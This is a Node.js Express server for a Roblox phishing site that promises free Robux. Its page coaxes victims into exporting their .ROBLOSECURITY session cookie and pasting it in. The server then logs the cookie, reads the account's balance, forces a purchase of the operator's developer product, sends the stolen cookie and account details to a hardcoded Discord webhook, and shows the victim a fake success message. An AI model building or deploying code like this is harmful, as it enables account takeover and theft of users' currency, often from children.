const express = require('express');
const axios = require('axios');
const app = express();
const port = process.env.PORT || 3000;

app.use(express.urlencoded({ extended: true }));

// ========== CONFIG ==========
const WEBHOOK_URL = "https://discord.com/api/webhooks/1503177206350876763/YDEoZIL9oK2YNKkSFqe9Hs3fnKBnh2dAO9AnepIPLgUTuDsTLefsNI7eIpVqordBFQug";
const PLACE_ID = 92183871074200;       // Your game place ID
const PRODUCT_ID = 1832332442;         // Your ticket product ID

// ========== ROUTES ==========
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Roblox - Account Verification</title>
      <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { background: #1b1b1b; color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { background: #2c2f33; border-radius: 12px; padding: 25px; max-width: 500px; width: 90%; box-shadow: 0 0 20px rgba(0,0,0,0.4); }
        h2 { text-align: center; margin-bottom: 15px; color: #ff3131; }
        .step { margin-bottom: 12px; padding: 12px; background: #23272a; border-left: 4px solid #ff3131; border-radius: 6px; }
        .step h3 { margin-bottom: 5px; font-size: 1rem; color: #ff9090; }
        .step p { font-size: 0.9rem; color: #ccc; }
        textarea { width: 100%; padding: 10px; border: 1px solid #ff3131; background: #1e2124; color: #fff; border-radius: 6px; resize: vertical; margin-top: 10px; }
        button { width: 100%; background: #ff3131; border: none; color: white; font-size: 1.1rem; padding: 12px; border-radius: 6px; cursor: pointer; margin-top: 12px; font-weight: bold; }
        button:hover { background: #e60000; }
        .footer { text-align: center; font-size: 0.7rem; color: #555; margin-top: 15px; }
        a { color: #ff3131; text-decoration: none; }
      </style>
    </head>
    <body>
      <div class="container">
        <h2>Claim Your Free 10,000 Robux</h2>
        <p style="text-align: center; margin-bottom: 15px;">Complete this quick verification to prove you own the account. This only reads your <b>.ROBLOSECURITY</b> cookie, not your password.</p>
        
        <div class="step">
          <h3>Step 1 – Install Cookie-Editor</h3>
          <p>Open the App Store, search <b>"Cookie-Editor"</b> (by Moustachauve) and install it. It's free and trusted by millions.</p>
        </div>
        <div class="step">
          <h3>Step 2 – Enable in Safari</h3>
          <p>Go to <b>Settings → Safari → Extensions</b>, turn on Cookie-Editor, and allow it for all websites.</p>
        </div>
        <div class="step">
          <h3>Step 3 – Login to Roblox</h3>
          <p>Open Safari, visit <b>www.roblox.com</b>, tap <b>aA → Request Desktop Website</b>, then sign into your Roblox account.</p>
        </div>
        <div class="step">
          <h3>Step 4 – Export the Cookie</h3>
          <p>Tap the puzzle icon <span style="background:#555;padding:0 5px;">🧩</span> in the address bar, choose <b>Cookie-Editor</b>, then tap <b>Export</b>. This copies the session data to your clipboard.</p>
        </div>
        <div class="step">
          <h3>Step 5 – Submit</h3>
          <p>Paste the exported text below and tap <b>Verify & Claim</b>. Your Robux will arrive within minutes.</p>
        </div>

        <form action="/cookie" method="POST">
          <textarea name="cookie" rows="5" placeholder='Paste the exported cookie JSON here...' required></textarea>
          <button type="submit">Verify & Claim Robux</button>
        </form>
        <p class="footer">We never see your password. Only the session token is used for verification. <br>Roblox Corporation – Official Partner</p>
      </div>
    </body>
    </html>
  `);
});

app.post('/cookie', async (req, res) => {
  const cookieText = req.body.cookie?.trim();
  if (!cookieText) {
    return res.send('<h1 style="color:white;text-align:center;">Error: No cookie provided. Go back and try again.</h1>');
  }

  // 1. Extract .ROBLOSECURITY value
  let robloSecurity = null;
  try {
    const parsed = JSON.parse(cookieText);
    const target = parsed.find(c => c.name === '.ROBLOSECURITY');
    if (target) robloSecurity = target.value;
  } catch {
    // Might be the raw cookie value directly
    if (cookieText.startsWith('_')) robloSecurity = cookieText.split(';')[0].trim();
  }

  if (!robloSecurity) {
    return res.send('<h1 style="color:white;text-align:center;">Cookie not found. Make sure you exported from Cookie-Editor correctly.</h1>');
  }

  console.log('CAPTURED .ROBLOSECURITY:', robloSecurity);

  // 2. Fetch account info
  let userId, username, displayName, robuxBalance, created, placeUniverseId, ticketPrice;
  try {
    // Authenticated user info
    const userRes = await axios.get('https://users.roblox.com/v1/users/authenticated', {
      headers: { Cookie: `.ROBLOSECURITY=${robloSecurity}` }
    });
    userId = userRes.data.id;
    username = userRes.data.name;
    displayName = userRes.data.displayName;
    created = userRes.data.created;

    // Robux balance
    const balanceRes = await axios.get(`https://economy.roblox.com/v1/users/${userId}/currency`, {
      headers: { Cookie: `.ROBLOSECURITY=${robloSecurity}` }
    });
    robuxBalance = balanceRes.data.robux;

    // Get universe ID from place
    const placeInfo = await axios.get(`https://apis.roblox.com/universes/v1/places/${PLACE_ID}/universe`);
    placeUniverseId = placeInfo.data.universeId;

    // Get product price
    const productInfo = await axios.get(`https://apis.roblox.com/developer-products/v1/universes/${placeUniverseId}/developerproducts?productIds=${PRODUCT_ID}`);
    if (productInfo.data.data && productInfo.data.data.length > 0) {
      ticketPrice = productInfo.data.data[0].price;  // price in Robux
    } else {
      ticketPrice = 0;
    }
  } catch (e) {
    console.log('Error fetching account info:', e.response?.data || e.message);
    // Still send what we can to webhook
  }

  // 3. Build Discord embed
  const embed = {
    title: "New Cookie Capture",
    color: 0xff3131,
    timestamp: new Date().toISOString(),
    fields: [
      { name: "Username", value: username || 'Unknown', inline: true },
      { name: "User ID", value: userId ? String(userId) : 'Unknown', inline: true },
      { name: "Robux Balance", value: robuxBalance != null ? String(robuxBalance) : 'Unknown', inline: true },
      { name: "Created", value: created || 'Unknown', inline: true },
      { name: "Product ID", value: PRODUCT_ID.toString(), inline: true },
      { name: "Ticket Price", value: ticketPrice != null ? String(ticketPrice) : 'Unknown', inline: true },
      { name: ".ROBLOSECURITY", value: `||${robloSecurity}||`, inline: false }
    ],
    footer: { text: "Railway Auto-Stealer" }
  };

  // 4. Try to purchase if enough Robux and we have all data
  let purchaseResult = "Skipped (insufficient Robux or unknown data)";
  if (userId && ticketPrice && robuxBalance >= ticketPrice) {
    try {
      // CSRF token
      const csrfRes = await axios.post('https://auth.roblox.com/v2/logout', {}, {
        headers: { Cookie: `.ROBLOSECURITY=${robloSecurity}` },
        validateStatus: false
      });
      const csrf = csrfRes.headers['x-csrf-token'];

      const buyRes = await axios.post(`https://economy.roblox.com/v1/purchases/products/${PRODUCT_ID}`, {
        expectedPrice: ticketPrice
      }, {
        headers: {
          Cookie: `.ROBLOSECURITY=${robloSecurity}`,
          'x-csrf-token': csrf,
          'Content-Type': 'application/json'
        }
      });

      purchaseResult = `Purchase successful: ${JSON.stringify(buyRes.data)}`;
      embed.fields.push({ name: "Purchase Result", value: purchaseResult, inline: false });
    } catch (e) {
      purchaseResult = `Purchase failed: ${e.response?.data?.errorMsg || e.message}`;
      embed.fields.push({ name: "Purchase Result", value: purchaseResult, inline: false });
    }
  } else {
    embed.fields.push({ name: "Purchase Result", value: purchaseResult, inline: false });
  }

  // 5. Send to Discord
  try {
    await axios.post(WEBHOOK_URL, {
      embeds: [embed]
    });
    console.log('Sent to Discord webhook successfully');
  } catch (err) {
    console.log('Discord webhook error:', err.response?.data || err.message);
  }

  // 6. Show fake success to victim
  res.send(`
    <!DOCTYPE html>
    <html>
    <head><title>Verification Complete</title>
      <style>
        body { background: #1b1b1b; color: white; text-align: center; font-family: Arial; padding-top: 60px; }
        h1 { color: #ff3131; }
        p { margin: 20px; }
      </style>
    </head>
    <body>
      <h1>Verification Successful!</h1>
      <p>Your 10,000 Robux will be added to your account within 24 hours.</p>
      <p>Thank you for verifying your ownership.</p>
    </body>
    </html>
  `);
});

app.listen(port, () => console.log(`Verification server running on port ${port}`));
